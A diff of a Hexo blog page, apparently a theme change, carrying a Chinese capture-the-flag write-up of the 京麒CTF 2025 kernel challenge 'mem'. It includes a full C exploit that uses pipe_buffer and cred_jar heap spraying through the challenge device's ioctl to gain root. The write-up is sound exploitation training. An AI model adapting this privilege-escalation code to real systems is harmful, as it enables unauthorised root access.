@@ -1,26 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html lang=zh>
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="第一个在赛时做出来的Kernel Pwn，太不容易了  防护检查杂项检查.&#x2F;run.sh脚本中启用了smap,smep,kaslr防护，此外没什么特殊的文件系统经检验没有权限漏洞给了Kconfig，内核版本为Linux v6.6.91，较高版本，赛时没有详细检查Kconfig中的条目 Kconfig检查Kconfig中的CONFIG_USER_NS没有打开，意味着我们无法开辟自己的命名空间，也就">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第一个在赛时做出来的Kernel Pwn，太不容易了  防护检查杂项检查.&#x2F;run.sh脚本中启用了smap,smep,kaslr防护，此外没什么特殊的文件系统经检验没有权限漏洞给了Kconfig，内核版本为Linux v6.6.91，较高版本，赛时没有详细检查Kconfig中的条目 Kconfig检查Kconfig中的CONFIG_USER_NS没有打开，意味着我们无法开辟自己的命名空间，也就">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[京麒CTF 2025] mem writeup">
 <meta property="og:url" content="http://example.com/2025/05/26/2025jqctf-mem/index.html">
@@ -38,170 +24,157 @@
 <meta property="article:tag" content="kernel">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/2025jqctf-mem/huawei.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>[京麒CTF 2025] mem writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
-<link rel="canonical" href="http://example.com/2025/05/26/2025jqctf-mem/">
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh'
-  };
-</script>
-
-  <title>[京麒CTF 2025] mem writeup | Blog de Назриндак</title>
-  
+    <!-- Umami Analytics -->
 
 
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
 
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li><!--
+     --><!--
+       --><li><a href="/tags">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/21/pwncollege-ker/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/26/2025jqctf-mem/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/26/2025jqctf-mem/&text=[京麒CTF 2025] mem writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/26/2025jqctf-mem/&is_video=false&description=[京麒CTF 2025] mem writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[京麒CTF 2025] mem writeup&body=Check out this article: http://example.com/2025/05/26/2025jqctf-mem/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/26/2025jqctf-mem/&title=[京麒CTF 2025] mem writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/26/2025jqctf-mem/&name=[京麒CTF 2025] mem writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/26/2025jqctf-mem/&t=[京麒CTF 2025] mem writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
 
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
     </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Blog de Назриндак</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">二进制安全爱好者</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">防护检查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E6%A3%80%E6%9F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">杂项检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kconfig%E6%A3%80%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">Kconfig检查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6%E7%AD%96%E7%95%A5"><span class="toc-number">3.2.</span> <span class="toc-text">赛时策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E8%BF%9B%E7%AD%96%E7%95%A5"><span class="toc-number">3.3.</span> <span class="toc-text">改进策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exp"><span class="toc-number">4.</span> <span class="toc-text">Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E6%97%B6Exp"><span class="toc-number">4.1.</span> <span class="toc-text">赛时Exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B9%E8%BF%9BExp"><span class="toc-number">4.2.</span> <span class="toc-text">改进Exp</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
 </div>
 
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/26/2025jqctf-mem/">
+    <h1 class="posttitle p-name" itemprop="name headline">
+        [京麒CTF 2025] mem writeup
+    </h1>
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="NazrinDuck">
-      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Blog de Назриндак">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          [京麒CTF 2025] mem writeup
-        </h1>
 
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">NazrinDuck</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-25T16:08:05.000Z" class="dt-published" itemprop="datePublished">2025-05-26</time>
+        
+      
+    </div>
 
-              <time title="Created: 2025-05-26 00:08:05 / Modified: 20:39:55" itemprop="dateCreated datePublished" datetime="2025-05-26T00:08:05+08:00">2025-05-26</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
 
       
-        <blockquote>
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/kernel/" rel="tag">kernel</a>, <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
 <p>第一个在赛时做出来的Kernel Pwn，太不容易了</p>
 </blockquote>
 <h2 id="防护检查"><a href="#防护检查" class="headerlink" title="防护检查"></a>防护检查</h2><h3 id="杂项检查"><a href="#杂项检查" class="headerlink" title="杂项检查"></a>杂项检查</h3><p><code>./run.sh</code>脚本中启用了smap,smep,kaslr防护，此外没什么特殊的<br>文件系统经检验没有权限漏洞<br>给了Kconfig，内核版本为<strong>Linux v6.6.91</strong>，较高版本，赛时没有详细检查Kconfig中的条目</p>
@@ -290,192 +263,183 @@
 </blockquote>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> Linux Kernel exploit template</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">//  INFO: Step 0x01: spray pipe_buffer</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe_buffer&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUMS 0x100</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> pipe_fds[PIPE_NUMS][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> pipe_buf[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="type">char</span> pipe_recv[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fds[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    pipe_buf[<span class="number">0xa</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    pipe_buf[<span class="number">0xb</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    check(write(pipe_fds[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe_buffer successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    close(pipe_fds[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fds[i][<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x02: open device</span></span><br><span class="line">  step(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = check(open(device, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;device open successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: fill pipe and close victim</span></span><br><span class="line">  step(<span class="string">&quot;fill hole and close victim&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUMS; i += <span class="number">2</span>) &#123;</span><br><span class="line">    check(pipe(pipe_fds[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    pipe_buf[<span class="number">0xa</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    pipe_buf[<span class="number">0xb</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    check(write(pipe_fds[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;fill page hole with new pipe_buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">insn</span> <span class="title">overread</span>[] =</span> &#123;</span><br><span class="line">      &#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1008</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">14</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">      &#123;.idx = <span class="number">11</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  info(<span class="string">&quot;prepare to overread\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *dev_recv = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(write(fd, overread, <span class="keyword">sizeof</span>(overread)));</span><br><span class="line">  check(ioctl(fd, <span class="number">0x7601</span>));</span><br><span class="line">  check(read(fd, dev_recv, <span class="number">0x4</span>));</span><br><span class="line">  dump_hex(dev_recv, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> victim = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dev_recv[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span> &amp;&amp; dev_recv[<span class="number">3</span>] == <span class="string">&#x27;e&#x27;</span>) &#123;</span><br><span class="line">    victim = (<span class="type">uint8_t</span>)dev_recv[<span class="number">0</span>];</span><br><span class="line">    success(<span class="string">&quot;find victim pipe: No.%hhu!\n&quot;</span>, victim);</span><br><span class="line">    <span class="keyword">goto</span> FOUND;</span><br><span class="line">  &#125;</span><br><span class="line">  err_exit(<span class="string">&quot;victim not found&quot;</span>);</span><br><span class="line"></span><br><span class="line">FOUND:</span><br><span class="line">  <span class="comment">// INFO: Step 0x04: fork and root</span></span><br><span class="line">  step(<span class="string">&quot;fork and root&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check(close(pipe_fds[victim][<span class="number">0</span>]));</span><br><span class="line">  check(close(pipe_fds[victim][<span class="number">1</span>]));</span><br><span class="line">  info(<span class="string">&quot;close victim pipe\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; ++i) &#123;</span><br><span class="line">    setuid(<span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;spray cred_jar\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        shell_noerr();</span><br><span class="line">        sleep(<span class="number">0x1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;fork to root\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">insn</span> <span class="title">insns</span>[32];</span></span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x8</span>; ++i) &#123;</span><br><span class="line">    insns[idx++] = (<span class="keyword">struct</span> insn)&#123;</span><br><span class="line">        .idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x1008</span> + <span class="number">0x4</span> * i, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">    insns[idx++] =</span><br><span class="line">        (<span class="keyword">struct</span> insn)&#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">20</span> + <span class="number">24</span> * i, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">    insns[idx++] =</span><br><span class="line">        (<span class="keyword">struct</span> insn)&#123;.idx = <span class="number">10</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">    insns[idx++] =</span><br><span class="line">        (<span class="keyword">struct</span> insn)&#123;.idx = <span class="number">12</span>, .next = <span class="number">4</span>, .imm1 = <span class="number">0x0</span>, .imm2 = <span class="number">0x0</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(write(fd, insns, <span class="keyword">sizeof</span>(insns)));</span><br><span class="line">  check(ioctl(fd, <span class="number">0x7601</span>));</span><br><span class="line">  info(<span class="string">&quot;overwrite to trigger root...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    sleep(<span class="number">0x100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    </div>
-
-    
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/pwn/" rel="tag"># pwn</a>
-              <a href="/tags/kernel/" rel="tag"># kernel</a>
-          </div>
-
-        
+  </div>
+</article>
 
 
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2025/05/21/pwncollege-ker/" rel="prev" title="[pwn.college] Kernel Exploitation 解题记录">
-      <i class="fa fa-chevron-left"></i> [pwn.college] Kernel Exploitation 解题记录
-    </a></div>
-      <div class="post-nav-item"></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
         </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
+    </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
